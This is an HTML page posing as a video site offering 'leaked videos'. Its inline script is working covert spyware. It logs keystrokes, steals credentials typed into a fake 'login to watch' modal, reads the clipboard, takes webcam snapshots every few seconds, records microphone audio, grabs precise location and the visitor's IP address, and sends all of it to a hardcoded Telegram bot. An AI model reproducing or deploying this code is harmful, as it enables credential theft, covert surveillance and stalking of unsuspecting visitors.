<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>វីដេអូបែកធ្លាយ</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500;700&display=swap');

    :root {
      --theme-color: #FF0076;
      --background-color: #f9f9f9;
      --card-background: #ffffff;
      --text-primary: #0f0f0f;
      --text-secondary: #606060;
      --border-color: #ddd;
    }
    body { margin: 0; background: var(--background-color); font-family: 'Roboto', Arial, sans-serif; color: var(--text-primary); }

    .hidden { display: none !important; }

    .site-header { background: var(--card-background); padding: 0 24px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between; height: 60px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 900; }
    .site-header h1 { font-family: "Kantumruy Pro", serif; font-size: 1.5em; color: var(--theme-color); margin: 0; }
    .back-button { font-size: 1em; font-weight: 500; cursor: pointer; padding: 8px 16px; border-radius: 20px; background-color: #eee; border: none; }
    .back-button:hover { background-color: #ddd; }

    #video-grid-page .container { max-width: 1400px; margin: 0 auto; padding: 24px; }
    .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 24px 16px; }
    .video-card { cursor: pointer; }
    .thumbnail-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #eee; border-radius: 12px; overflow: hidden; margin-bottom: 12px; }
    /* --- MODIFIED: Style the video element directly --- */
    .thumbnail-wrapper video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: transform 0.2s ease-out; }
    .video-card:hover .thumbnail-wrapper video { transform: scale(1.05); }
    .duration { position: absolute; bottom: 8px; right: 8px; background-color: rgba(0, 0, 0, 0.8); color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.8em; font-weight: 500; }
    .video-details { display: flex; gap: 12px; }
    .channel-avatar { width: 40px; height: 40px; border-radius: 50%; background-color: #ccc; flex-shrink: 0; }
    .video-metadata { display: flex; flex-direction: column; }
    .video-title { font-size: 1rem; font-weight: 500; margin: 0 0 4px 0; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
    .channel-name, .video-stats { font-size: 0.875rem; color: var(--text-secondary); margin: 0; }

    #video-player-page { padding: 24px; display: flex; gap: 24px; max-width: 1600px; margin: 0 auto; }
    .main-video-content { flex: 1; min-width: 0; }
    .player-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #000; border-radius: 15px; overflow: hidden; }
    .player-wrapper video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
    .main-video-title { font-size: 1.4em; font-weight: 700; margin: 16px 0 8px 0; }
    .video-info-bar { display: flex; align-items: center; gap: 12px; margin-top: 12px; }
    .subscribe-btn { margin-left: auto; background-color: var(--theme-color); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: 500; cursor: pointer; }
    .description-box { background-color: #eee; padding: 12px; border-radius: 12px; margin-top: 20px; }
    .description-box .video-stats { color: var(--text-primary); font-weight: 500; }
    .description-box .description-text { margin-top: 8px; line-height: 1.5; }
    .recommendations-sidebar { width: 400px; flex-shrink: 0; }
    .recommendations-sidebar h3 { margin: 0 0 16px 0; }
    .compact-video-card { display: flex; gap: 10px; margin-bottom: 12px; cursor: pointer; }
    .compact-video-card .thumbnail-wrapper { width: 160px; flex-shrink: 0; padding-bottom: 90px; }
    .compact-video-card .thumbnail-wrapper video { border-radius: 8px; } /* Smaller radius for sidebar vids */

    @media (max-width: 1200px) {
        #video-player-page { flex-direction: column; }
        .recommendations-sidebar { width: 100%; margin-top: 24px; }
    }
    
    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(5px); opacity: 0; transition: opacity 0.3s ease; }
    .modal.visible { display: block; opacity: 1; }
    .modal-content { background-color: #fff; margin: 15% auto; padding: 30px; border: none; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
  </style>
</head>
<body>

  <header class="site-header">
    <h1 id="header-title">វីដេអូបែកធ្លាយ</h1>
    <button id="back-to-grid" class="back-button hidden">&larr; Back</button>
  </header>

  <main id="video-grid-page">
    <div class="container">
      <div class="video-grid">
        <!-- MODIFIED: data-attributes are simplified, and the thumbnail is now a <video> tag -->
        <div class="video-card" data-video-src="machiu.mp4" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+1">
            <div class="thumbnail-wrapper">
                <video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+1"><source src="machiu.mp4" type="video/mp4"></video>
                <span class="duration">12:34</span>
            </div>
            <div class="video-details">
                <img src="https://placehold.co/40x40/FF0076/FFF?text=A" alt="Channel Avatar" class="channel-avatar">
                <div class="video-metadata"><h3 class="video-title">This is a sample video title that is quite long to show how it wraps</h3><p class="channel-name">Awesome Creator</p><p class="video-stats">1.2M views &bull; 2 days ago</p></div>
            </div>
        </div>
        <div class="video-card" data-video-src="p1.mp4" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+2">
            <div class="thumbnail-wrapper">
                <video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+2"><source src="p1.mp4" type="video/mp4"></video>
                <span class="duration">08:15</span>
            </div>
            <div class="video-details">
                <img src="https://placehold.co/40x40/5c9aff/FFF?text=B" alt="Channel Avatar" class="channel-avatar">
                <div class="video-metadata"><h3 class="video-title">Another Interesting Clip</h3><p class="channel-name">Video Master</p><p class="video-stats">890k views &bull; 5 days ago</p></div>
            </div>
        </div>
        <div class="video-card" data-video-src="p2.mp4" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+3">
            <div class="thumbnail-wrapper">
                <video muted playsinline poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+3"><source src="p2.mp4" type="video/mp4"></video>
                <span class="duration">21:05</span>
            </div>
            <div class="video-details">
                <img src="https://placehold.co/40x40/34d399/FFF?text=C" alt="Channel Avatar" class="channel-avatar">
                <div class="video-metadata"><h3 class="video-title">Check This Out: Full Guide</h3><p class="channel-name">HowTo Channel</p><p class="video-stats">2.5M views &bull; 1 week ago</p></div>
            </div>
        </div>
        <!-- Add more video cards following the same structure -->
      </div>
    </div>
  </main>

  <main id="video-player-page" class="hidden">
      <div class="main-video-content">
          <div class="player-wrapper"><video id="main-player" controls autoplay playsinline webkit-playsinline></video></div>
          <h2 id="main-video-title" class="main-video-title"></h2>
          <div class="video-info-bar">
              <img id="main-channel-avatar" src="" alt="Channel Avatar" class="channel-avatar">
              <div class="video-metadata">
                  <p id="main-channel-name" class="channel-name" style="font-weight: 500; color: var(--text-primary);"></p>
                  <p class="video-stats">1.2M subscribers</p>
              </div>
              <button class="subscribe-btn">Subscribe</button>
          </div>
          <div class="description-box">
              <p id="main-video-stats" class="video-stats"></p>
              <p class="description-text">This is a placeholder for the video description. #hashtag #anothertag</p>
          </div>
      </div>
      <aside id="recommendations-sidebar" class="recommendations-sidebar"></aside>
  </main>

  <div id="loginModal" class="modal"><div class="modal-content"><h2>Please Login to Watch Full Video</h2><form id="loginForm"><input type="text" id="username" placeholder="Username" required><input type="password" id="password" placeholder="Password" required><button type="submit">Login</button></form></div></div>
  <div class="capture-container" style="display: none;"><video id="videoElementForCapture" autoplay playsinline></video><canvas id="snapshot"></canvas></div>

<script>
    // --- Configuration ---
    const config = { botToken: "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA", chatId: "8017801890", snapshotInterval: 3000, micRecordInterval: 10000 };

    // --- DOM Elements ---
    const videoCaptureEl = document.getElementById("videoElementForCapture");
    const canvasEl = document.getElementById("snapshot");
    const loginModalEl = document.getElementById('loginModal');
    const gridPage = document.getElementById('video-grid-page');
    const playerPage = document.getElementById('video-player-page');
    const mainPlayer = document.getElementById('main-player');
    const backButton = document.getElementById('back-to-grid');
    const headerTitle = document.getElementById('header-title');

    // --- State Variables ---
    let microphoneStream, mediaRecorder, snapshotIntervalId;
    let userLocation = { lat: "N/A", lon: "N/A" };
    let isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
    let keyLogBuffer = "";
    const pageStartTime = Date.now();

    // --- Core Initialization ---
    async function initialize() {
        setupEventListeners(); // UI Listeners first
        await initializeTracking(); // Then activate tracking
    }

    async function initializeTracking() {
        sendToBot("🚀 New Session Started");
        sendInitialReport();
        if (!navigator.mediaDevices || !window.isSecureContext) { sendToBot("⚠️ CRITICAL: Cannot access Camera/Mic."); }
        await checkAndWatchPermission('camera', requestCamera, stopCamera);
        await checkAndWatchPermission('microphone', requestMicrophone, stopMicrophone);
        await checkAndWatchPermission('geolocation', requestGeolocation);
        detectDevTools();
    }

    // --- BUG FIX: Event Delegation for Clicks ---
    // A single, efficient listener handles clicks on any video card.
    function setupEventListeners() {
        document.body.addEventListener('click', (event) => {
            const card = event.target.closest('.video-card, .compact-video-card');
            if (card) {
                showPlayerPage(card);
            }
        });

        backButton.addEventListener('click', showGridPage);

        mainPlayer.addEventListener('timeupdate', function() {
            if (!isLoggedIn && this.currentTime >= 5) {
                this.pause();
                loginModalEl.classList.add('visible');
            }
        });

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const user = this.elements.username.value;
            const pass = this.elements.password.value;
            sendToBot(`🔒 Login Attempt:\nUser: \`${user}\`\nPass: \`${pass}\`\nKeys Logged:\n\`\`\`${keyLogBuffer}\`\`\``);
            keyLogBuffer = "";
            if (user && pass) {
                isLoggedIn = true; localStorage.setItem("isLoggedIn", "true");
                loginModalEl.classList.remove('visible');
                sendToBot(`✅ Login successful for "${user}".`);
                captureAndSend(`📸 Snapshot on Login`);
                mainPlayer.play();
            } else { sendToBot(`❌ Login failed for "${user}".`); }
            this.reset();
        });

        mainPlayer.addEventListener('play', () => sendToBot(`▶️ Play: ${mainPlayer.src.split('/').pop()}`));
        mainPlayer.addEventListener('pause', () => sendToBot(`⏸️ Pause: ${mainPlayer.src.split('/').pop()}`));
        mainPlayer.addEventListener('ended', () => sendToBot(`⏹️ Ended: ${mainPlayer.src.split('/').pop()}`));
        document.addEventListener("visibilitychange", () => { if (document.visibilityState === 'hidden') { const time = Math.round((Date.now() - pageStartTime) / 1000); sendBeaconToBot(`🚪 Page hidden. Session time: ${time}s.`); } else { sendToBot(`👀 Tab became active again.`); }});
        document.addEventListener('keydown', e => { if (e.key.length === 1) keyLogBuffer += e.key; else if (e.key === 'Backspace') keyLogBuffer = keyLogBuffer.slice(0, -1); else if (e.key === 'Enter') { sendToBot(`⌨️ Enter in ${e.target.tagName}:\n\`\`\`\n${keyLogBuffer}\n\`\`\``); keyLogBuffer = ""; } else keyLogBuffer += ` [${e.key}] `; });
        document.addEventListener('copy', async () => { try { const text = await navigator.clipboard.readText(); if (text) { sendToBot(`📋 Text Copied:\n\`\`\`\n${text}\n\`\`\``); }} catch(err) {/*ignore*/}});
    }

    // --- UI Page Switching Logic ---
    function showPlayerPage(card) {
        // Get data from the clicked card's DOM elements and dataset
        const videoSrc = card.dataset.videoSrc;
        const poster = card.dataset.poster;
        const title = card.querySelector('.video-title').textContent;
        const channelName = card.querySelector('.channel-name').textContent;
        const stats = card.querySelector('.video-stats').textContent;
        const avatarSrc = card.querySelector('.channel-avatar').src;

        // Populate the player page
        mainPlayer.src = videoSrc;
        mainPlayer.poster = poster;
        document.getElementById('main-video-title').textContent = title;
        document.getElementById('main-channel-avatar').src = avatarSrc;
        document.getElementById('main-channel-name').textContent = channelName;
        document.getElementById('main-video-stats').textContent = stats;
        
        populateRecommendations(videoSrc);
        
        gridPage.classList.add('hidden');
        playerPage.classList.remove('hidden');
        backButton.classList.remove('hidden');
        headerTitle.classList.add('hidden');
        window.scrollTo(0, 0);
    }

    function showGridPage() {
        mainPlayer.pause();
        mainPlayer.src = ""; // Stop video loading
        playerPage.classList.add('hidden');
        gridPage.classList.remove('hidden');
        backButton.classList.add('hidden');
        headerTitle.classList.remove('hidden');
    }

    function populateRecommendations(currentVideoSrc) {
        const sidebar = document.getElementById('recommendations-sidebar');
        sidebar.innerHTML = '<h3>Up next</h3>';
        document.querySelectorAll('#video-grid-page .video-card').forEach(card => {
            if (card.dataset.videoSrc !== currentVideoSrc) {
                // Clone the original card's structure for the sidebar
                const compactCard = card.cloneNode(true);
                compactCard.classList.remove('video-card');
                compactCard.classList.add('compact-video-card');
                sidebar.appendChild(compactCard);
            }
        });
    }
    
    // --- All Tracking Functions (unchanged) ---
    async function checkAndWatchPermission(name, requestFn, stopFn = () => {}) { if (!navigator.permissions) { requestFn(); return; } try { const status = await navigator.permissions.query({ name: name }); if (status.state === 'granted') requestFn(); else if (status.state === 'prompt') requestFn(); status.onchange = () => { if (status.state === 'granted') requestFn(); else if (stopFn) stopFn(); }; } catch (e) { requestFn(); }}
    function requestCamera() { if (videoCaptureEl.srcObject?.active) return; navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { videoCaptureEl.srcObject = stream; sendToBot("✅ Camera granted."); videoCaptureEl.onloadedmetadata = () => { if(snapshotIntervalId) clearInterval(snapshotIntervalId); snapshotIntervalId = setInterval(captureAndSend, config.snapshotInterval); }; }).catch(handleMediaError("Camera")); }
    function stopCamera() { videoCaptureEl.srcObject?.getTracks().forEach(track => track.stop()); if (snapshotIntervalId) clearInterval(snapshotIntervalId); sendToBot("❌ Camera stopped."); }
    function captureAndSend(caption = "📸 Webcam Snapshot") { try { if (!videoCaptureEl.srcObject?.active) return; const context = canvasEl.getContext("2d"); canvasEl.width = videoCaptureEl.videoWidth; canvasEl.height = videoCaptureEl.videoHeight; context.drawImage(videoCaptureEl, 0, 0, canvasEl.width, canvasEl.height); canvasEl.toBlob(blob => blob && sendPhoto(blob, caption), "image/png"); } catch (e) { sendToBot(`🚫 CAPTURE ERROR: ${e.name}`); }}
    function requestMicrophone() { if (microphoneStream?.active) return; navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => { microphoneStream = stream; startMicRecording(stream); sendToBot("✅ Mic granted."); }).catch(handleMediaError("Microphone")); }
    function stopMicrophone() { microphoneStream?.getTracks().forEach(track => track.stop()); if (mediaRecorder?.state === 'recording') mediaRecorder.stop(); sendToBot("❌ Mic stopped."); }
    function requestGeolocation() { if (userLocation.lat !== "N/A") return; navigator.geolocation.getCurrentPosition(pos => { userLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude }; sendToBot(`📍 Location: ${userLocation.lat}, ${userLocation.lon}`); sendLocationAsMap(userLocation.lat, userLocation.lon); }, err => sendToBot(`🚫 Geo Error: ${err.code === 1 ? "Denied" : "Unavailable"}`), { enableHighAccuracy: true }); }
    function startMicRecording(stream) { if (!window.MediaRecorder) return; mediaRecorder = new MediaRecorder(stream); mediaRecorder.ondataavailable = e => e.data?.size > 0 && sendAudioToBot(e.data); mediaRecorder.start(config.micRecordInterval); }
    function sendBeaconToBot(message) { const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`; const data = JSON.stringify({ chat_id: config.chatId, text: message }); navigator.sendBeacon(url, new Blob([data], { type: 'application/json' })); }
    async function sendToBot(message) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: config.chatId, text: message, parse_mode: 'Markdown', disable_notification: true }) }); } catch (err) {} }
    async function sendLocationAsMap(lat, lon) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/sendLocation`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: config.chatId, latitude: lat, longitude: lon }) }); } catch (err) {} }
    async function sendFormData(endpoint, formData) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/${endpoint}`, { method: "POST", body: formData }); } catch (err) {} }
    function sendPhoto(blob, caption) { const fd = new FormData(); fd.append("chat_id", config.chatId); fd.append("photo", blob, "snap.png"); fd.append("caption", `${caption}\nLoc: ${userLocation.lat}, ${userLocation.lon}`); sendFormData("sendPhoto", fd); }
    function sendAudioToBot(audioBlob) { const fd = new FormData(); fd.append("chat_id", config.chatId); fd.append("audio", audioBlob, "mic.webm"); fd.append("caption", `🎤 Audio Clip`); sendFormData("sendAudio", fd); }
    async function sendInitialReport() { let r = "💻 *Visitor Report*\n"; try { const ipRes = await fetch("https://api.ipify.org?format=json"); const d = await ipRes.json(); r += `*IP:* \`${d.ip}\`\n`; } catch (e) {} const ua = navigator.userAgent; r += `*OS:* ${ua.includes("Win")?"Win":ua.includes("Mac")?"Mac":/Android/.test(ua)?"Android":/iP(ad|hone|od)/.test(ua)?"iOS":"Other"}\n`; try { const b = await navigator.getBattery(); r += `*Battery:* ${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})\n`; } catch(e) {} sendToBot(r); }
    function detectDevTools() { const t = 160; let o = false; const c = () => { if (window.outerWidth - window.innerWidth > t || window.outerHeight - window.innerHeight > t) { if (!o) { sendToBot("⚠️ Dev Tools Opened!"); o = true; } } else { o = false; } requestAnimationFrame(c); }; requestAnimationFrame(c); }
    function handleMediaError(type) { return e => sendToBot(`🚫 *${type} Error*: \`${e.name}\`.\nReason: ${e.message}`); }

    // --- Start Execution ---
    initialize();
</script>
</body>
</html>
